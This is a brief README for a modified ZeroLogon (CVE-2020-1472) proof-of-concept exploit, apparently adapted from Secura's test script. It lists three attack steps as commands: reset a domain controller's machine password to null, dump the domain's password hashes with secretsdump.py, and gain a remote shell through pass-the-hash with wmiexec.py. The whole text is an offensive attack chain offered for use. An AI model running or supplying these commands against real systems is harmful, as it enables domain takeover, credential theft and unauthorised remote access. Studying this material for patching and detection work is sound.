# ZeroLogon - Exploit and Example
Modified the test PoC from Secura, CVE-2020-1472, in order to change the machine's password to null

## Run the exploit
`./zerologon_NULLPASS.py <dc-name> <dc-ip>`
![](https://i.imgur.com/R4Jui6O.png)

## Dump the hashes
`secretsdump.py -no-pass <dc-name>\$@<dc-ip>`
![](https://i.imgur.com/7GaZ9NY.png)

## Pass-The-Hash for shell access
`wmiexec.py -hashes <LM:NT> <username>@<ip>`
![](https://i.imgur.com/NCFVJ1o.png)
